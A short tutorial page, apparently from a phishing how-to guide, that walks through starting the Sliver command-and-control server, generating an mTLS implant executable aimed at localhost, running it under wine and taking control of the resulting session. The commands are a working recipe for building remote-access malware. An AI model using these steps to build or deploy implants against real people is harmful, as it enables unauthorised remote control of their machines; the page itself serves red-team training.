+++
title = "Sliver: Generating an implant"
weight = 50
+++

### Generate a new implant

```bash
mkdir -p ~/Desktop/op/sliver/implants
cd ~/Desktop/op/sliver
sliver-server_linux
```

We should now be in a `sliver` shell.

![Sliver Shell](/static/how-to-phishing/sliver-shell.png)

Now we can generate a test implant:

```bash
generate --mtls 127.0.0.1 --save implants/default-sliver.exe
```

### Testing implant

In the sliver shell:

```bash
mtls
```

In a new terminal window:

```bash
wine ~/Desktop/op/sliver/implants/default-sliver.exe
```
![Sliver Implant Test](/static/how-to-phishing/sliver-implant-test.png)

Now we can use the implant by calling `use [session id]`:

![Sliver Implant Usage](/static/how-to-phishing/sliver-implant-use.png)
